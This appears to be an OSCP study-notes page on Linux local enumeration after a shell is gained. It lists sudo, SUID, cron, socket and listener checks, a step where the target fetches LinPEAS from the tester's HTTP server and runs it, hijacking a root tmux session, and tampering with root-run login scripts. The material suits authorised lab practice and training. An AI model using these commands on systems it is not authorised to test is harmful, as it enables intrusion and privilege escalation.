# Linux - Local Enum

**Step 13 of 50 · Linux**

*Identify the user, host, kernel, and the local privilege paths available from the shell.*

> [!tip] 💡 Follow-along mode
> You are here after a usable Linux shell arrives. Run the identity and manual checks first, optionally add LinPEAS, then choose exactly one privilege path under **What did you get?**. If the shell is still awkward, return to [[Linux - Shell Stabilise]] before transferring tools.

## Run this

> **Why:** Manual checks give you the facts behind an automated finding. LinPEAS is a second pass, not a replacement for reading `sudo -l`, SUID, cron, services, credentials, and listening ports yourself.

Run the identity checks first:

```bash
whoami
id
hostname
uname -a
cat /etc/os-release 2>/dev/null
sudo -n -l 2>/dev/null || sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ps auxww
ss -lntup 2>/dev/null || netstat -lntup 2>/dev/null
find / -type f -writable 2>/dev/null | head -n 200
```

Optional LinPEAS pass. In a second Kali terminal, prepare the transfer server. Replace `LINPEAS_PATH_FROM_OUTPUT` with the path printed by `find`:

```bash
boxset TransferPort 8000
find /usr/share -type f -name 'linpeas.sh' -print -quit
cp "LINPEAS_PATH_FROM_OUTPUT" "$BoxDir/www/linpeas.sh"
python3 -m http.server "$TransferPort" --directory "$BoxDir/www"
```

Back in the target shell, use the first downloader that exists:

```bash
command -v curl || command -v wget
curl -fsSL "http://$LocalIP:$TransferPort/linpeas.sh" -o /tmp/linpeas.sh || wget "http://$LocalIP:$TransferPort/linpeas.sh" -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>&1 | tee /tmp/linpeas.out
```

## Example output

 > *Example shape only: the exact findings depend on the target and current user.*
```
uid=1000(username) gid=1000(username) groups=1000(username)
Linux host 5.x x86_64
[+] Sudoers file: /etc/sudoers
...
```
## What did you get?

- [ ] Sudo rights are found → **Go to Step 14 · [[Linux - Sudo Check]]**
- [ ] SUID files are found → **Go to Step 15 · [[Linux - SUID Check]]**
- [ ] Root cron jobs or writable scripts are found → **Go to Step 16 · [[Linux - Cron Check]]**
- [ ] A writable service is found → **Run `systemctl cat $ServiceName` and `ls -la $ServicePath`, then go to Step 10 · [[Linux - Exploit Search]] if the service file or binary is writable**
- [ ] Credentials appear in files → **Go to Step 17 · [[Linux - Credential Search]]**
- [ ] A kernel exploit candidate is shown → **Go to Step 19 · [[Linux - Kernel Exploit]]**
- [ ] Nothing useful is found → **Go to Step 17 · [[Linux - Credential Search]]**

## Notes

`$WebPort` is the target web port. `$TransferPort` is the Kali HTTP-server port. Keeping them separate prevents a common mistake where the target tries to download LinPEAS from its own web service.

## Gotcha

> [!warning] 💡
> Stop the temporary Kali HTTP server after the transfer. If neither `curl` nor `wget` exists, use the file-transfer alternatives in [[File Transfers]] or run the manual checks only.

## Writable scheduled script discovery

When a low-privilege shell can write a script outside the web root, identify who owns the file and whether a scheduler is executing it. Preserve the original before testing a controlled change, and use timestamps or a root-owned output file as evidence of execution.

> **Why:** These checks connect file ownership, writable permissions, and scheduled output before opening the focused cron-abuse page.
```bash
find / -type f -writable 2>/dev/null | grep -E '^/(scripts|opt|etc/cron|var/www)'
ls -la $ScriptDir $ScriptPath $OutputPath
stat $ScriptPath $OutputPath
```

## Additional routing

- [ ] A writable script and scheduled output are found → **Record the original with `cat $ScriptPath`, compare `stat $ScriptPath $OutputPath`, then go to Step 16 · [[Linux - Cron Check]]**

## Low-noise enumeration from a webshell

When the first command execution is an HTTP webshell rather than a terminal, gather only the identity, home-directory, scheduler, and process clues needed to choose the next branch. Use the shell stabilisation page after a callback lands.

```bash
id
whoami
hostname
find /home -maxdepth 2 -type f -printf '%p\n' 2>/dev/null
find /home -maxdepth 2 -type f \( -name 'crontab.*' -o -name '*cron*' \) -ls 2>/dev/null
ss -lntp 2>/dev/null
```

## Additional routing

- [ ] A user-specific crontab or scheduled PHP/script path is found → **Read the called source, then go to Step 16 · [[Linux - Cron Check]]**
- [ ] A callback shell is received → **Go to Step 12 · [[Linux - Shell Stabilise]] before full enumeration**

## Loopback service and Apache vhost pivot

When a listener appears on `127.0.0.1`, inspect Apache's enabled virtual hosts before attempting external access. A vhost can reveal the document root and an `AssignUserID` directive, which identifies the account that executes the internal application.

> **Why:** These commands connect the loopback port to its Apache configuration and expose the service's execution user and writable files.
```bash
ss -lntp
ls /etc/apache2/sites-enabled/
cat /etc/apache2/sites-enabled/internal.conf
ls -la /var/www/internal/
```

> [!warning] 💡
> If the current user owns the internal web root, check the PHP source before trying to brute-force a session-protected login. Rewriting an owned page may be the intended pivot.
## Root-owned custom service pivot

After obtaining a foothold from a service exploit, inspect local listeners and the process list for a second service running as root. A readable copy of its executable is enough to repeat offline crash analysis without requiring root filesystem access.

> **Why:** The process owner, listening port, and readable binary together identify a direct privilege-escalation path that is often faster than kernel or SUID hunting.
```bash
ss -lntp
ps aux | grep -E 'root|dawn'
find "$HOME" -maxdepth 1 -type f -iname '*dawn*' -ls
```

## Additional routing

- [ ] A root-owned custom listener and readable binary are found → **Copy the binary through `python3 -m http.server $WebPort --directory $HOME`, download it to `$BoxDir/loot`, then go to Step 10 · [[Linux - Exploit Search]]**
- [ ] No root-owned custom service is found → **Continue with SUID, sudo, cron, capabilities, and credential branches**
## FreeBSD loopback VNC branch

FreeBSD may not have Linux's `ss` output or familiar process flags. Use `netstat -an`, then correlate the listener with the VNC process.

```bash
netstat -an
ps aux | grep -i vnc
```

If the VNC RFB service is bound to `127.0.0.1`, it is invisible to the external scan. Record the exact remote port and the location of the authorized VNC password artifact, then go to Step 20 · [[Linux - Port Forwarding]].

## Additional routing

- [ ] A root-owned loopback VNC service is found → **Set `$RemotePort` to the RFB port and go to Step 20 · [[Linux - Port Forwarding]]**

## Login-triggered root scripts

If a reachable user can write to a script under `/etc/update-motd.d`, `/etc/profile.d`, or another login hook, identify who runs it and what event triggers it. This branch is especially important after a sudo-to-user pivot because the new user's group memberships may grant write access that the original foothold did not have.

```bash
find /etc/update-motd.d /etc/profile.d -maxdepth 1 -type f -ls 2>/dev/null
stat -c '%U:%G %A %n' /etc/update-motd.d/* /etc/profile.d/* 2>/dev/null
grep -RniE 'ssh|motd|profile|source|exec' /etc/ssh /etc/update-motd.d /etc/profile.d 2>/dev/null
```

- [ ] A root-run login script is writable → **Back it up, append only a controlled lab payload, trigger a fresh login, verify the side effect, restore it, then go to Step 15 · [[Linux - SUID Check]] if a SUID helper was created**
- [ ] The script is not writable → **Continue with sudo, SUID, cron, service, capability, and credential branches**

## Unix socket and tmux session discovery

When a local Unix-domain socket is readable by the current user, identify the owning process and test whether it belongs to a terminal multiplexer. A root-owned tmux socket can expose an existing privileged session without requiring a new exploit.

> **Why:** External scans cannot see local IPC endpoints. Socket ownership, permissions, and a successful tmux attach are the evidence chain for this branch.
```bash
find / -type s -ls 2>/dev/null
ls -la $SocketDir
tmux -S $TmuxSocket ls
tmux -S $TmuxSocket attach-session -t 0
id
```

> [!warning] 💡
> Attach only after confirming the socket path and permissions. Preserve the original socket evidence and avoid sending commands until the session identity is visible.

## Additional routing

- [ ] A root-owned, readable tmux socket is found -> **Attach to the existing session, confirm identity, then collect the root proof**

## Seen in
- *(no write-up yet)*
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- identity checks led to sudo enumeration
- [[OSCP/BOXES/WRITE UPS/Linux/OpenAdmin|OpenAdmin]] -- ONA config, loopback listeners, and Apache vhost exposed credential and pivot paths
- [[OSCP/BOXES/WRITE UPS/Linux/Dawn2|Dawn2]] -- local listeners and readable root-owned service binary exposed the second overflow
- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- writable `/scripts/test.py` and root-owned scheduled output exposed cron execution
- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- post-foothold identity checks led to sudo and SUID enumeration
- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- webshell identity and home-directory checks exposed a user cron path
- [[OSCP/BOXES/WRITE UPS/Linux/Poison|Poison]] -- FreeBSD identity checks, netstat, and process inspection exposed root's loopback VNC service
- [[OSCP/BOXES/WRITE UPS/Linux/Covfefe|Covfefe]] -- identity, architecture, history, and SUID checks routed to a custom helper source review
- [[OSCP/BOXES/WRITE UPS/Linux/TartarSauce|TartarSauce]] -- architecture checks, systemd timer enumeration, and backup-script review exposed the archive race
- [[OSCP/BOXES/WRITE UPS/Linux/Valentine|Valentine]] -- local socket enumeration exposed a root-owned tmux session after the SSH foothold
- [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- home-script review exposed the exact sudo-enabled journalctl invocation
- [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- identity and sudo checks exposed Luvit; MOTD permissions revealed a login-triggered root execution path

## Related stages

- [[Linux - Service Scan]]
- [[Linux - Web Enum]]
- [[Linux - Exploit Search]]

## External Resources

- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/index.html
- https://www.revshells.com/
## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
